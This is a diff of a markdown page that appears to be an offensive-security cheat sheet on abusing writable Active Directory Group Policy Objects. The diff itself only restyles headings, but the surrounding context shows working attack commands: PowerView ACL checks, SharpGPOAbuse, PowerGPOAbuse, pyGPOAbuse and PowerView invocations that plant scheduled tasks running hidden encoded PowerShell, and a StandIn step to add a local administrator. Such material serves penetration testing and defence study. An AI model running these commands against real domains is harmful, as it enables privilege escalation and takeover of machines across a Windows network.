@@ -12,7 +12,7 @@ GPO Priorization : Organization Unit > Domain > Site > Local
 Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: `gpupdate /force`.
 {% endhint %}
 
-## **Find vulnerable GPO**
+## <mark style="color:red;">**Find vulnerable GPO**</mark>
 
 Look a GPLink where you have the **Write** right.
 
@@ -20,7 +20,7 @@ Look a GPLink where you have the **Write** right.
 Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
 ```
 
-**Abuse GPO with SharpGPOAbuse**
+<mark style="color:green;">**Abuse GPO with SharpGPOAbuse**</mark>
 
 ```
 # Build and configure SharpGPOAbuse
@@ -43,7 +43,7 @@ ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\Co
 .\SharpGPOAbuse.exe --AddComputerTask --GPOName "VULNERABLE_GPO" --Author 'LAB.LOCAL\User' --TaskName "EvilTask" --Arguments  "/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND " --Command "cmd.exe" --Force
 ```
 
-**Abuse GPO with**[ **PowerGPOAbuse**](https://github.com/rootSySdk/PowerGPOAbuse)\*\*\*\*
+<mark style="color:green;">**Abuse GPO with**</mark>[ **PowerGPOAbuse**](https://github.com/rootSySdk/PowerGPOAbuse)
 
 ```
 PS> . .\PowerGPOAbuse.ps1
@@ -61,7 +61,7 @@ PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(
 PS> Add-UserTask/Add-ComputerTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator
 ```
 
-**Abuse GPO with pyGPOAbuse**
+<mark style="color:green;">**Abuse GPO with pyGPOAbuse**</mark>
 
 ```
 git clone https://github.com/Hackndo/pyGPOAbuse
@@ -78,7 +78,7 @@ git clone https://github.com/Hackndo/pyGPOAbuse
     -user
 ```
 
-**Abuse GPO with PowerView**
+**A**<mark style="color:green;">**buse GPO with PowerView**</mark>
 
 ```
 # Enumerate GPO
@@ -88,7 +88,7 @@ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
 New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
 ```
 
-**Abuse GPO with StandIn**
+<mark style="color:green;">**Abuse GPO with StandIn**</mark>
 
 ```
 # Add a local administrator
